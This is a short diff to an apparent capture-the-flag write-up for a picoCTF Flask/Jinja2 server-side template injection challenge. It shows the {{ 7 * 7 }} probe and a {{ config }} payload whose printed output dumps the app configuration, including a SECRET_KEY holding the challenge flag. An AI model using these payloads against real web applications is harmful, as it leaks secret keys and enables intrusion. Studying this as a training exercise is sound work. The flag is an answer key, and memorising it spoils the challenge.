@@ -3,4 +3,10 @@ https://portswigger.net/blog/server-side-template-injection
 
 sending in {{ 7 * 7 }} causes the engine to run it and produce 49
 
+https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
+
+sending in a question with {{ config }} will produce a dump of config data
+
+<Config {'USE_X_SENDFILE': False, 'JSON_AS_ASCII': True, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None, 'SESSION_COOKIE_SECURE': False, 'BOOTSTRAP_USE_MINIFIED': True, 'JSONIFY_MIMETYPE': 'application/json', 'JSONIFY_PRETTYPRINT_REGULAR': False, 'APPLICATION_ROOT': '/', 'MAX_COOKIE_SIZE': 4093, 'JSON_SORT_KEYS': True, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'TRAP_HTTP_EXCEPTIONS': False, 'PREFERRED_URL_SCHEME': 'http', 'DEBUG': False, 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'SQLALCHEMY_BINDS': None, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SERVER_NAME': None, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_COOKIE_PATH': None, 'SQLALCHEMY_POOL_SIZE': None, 'SECRET_KEY': 'picoCTF{secret_keys_to_the_kingdom_45e7608d}', 'SESSION_COOKIE_NAME': 'session', 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_HTTPONLY': True, 'TEMPLATES_AUTO_RELOAD': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'MAX_CONTENT_LENGTH': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'SQLALCHEMY_NATIVE_UNICODE': None, 'ENV': 'production', 'EXPLAIN_TEMPLATE_LOADING': False, 'TESTING': False, 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'PROPAGATE_EXCEPTIONS': None, 'BOOTSTRAP_SERVE_LOCAL': False, 'SQLALCHEMY_RECORD_QUERIES': None}> 
+
 
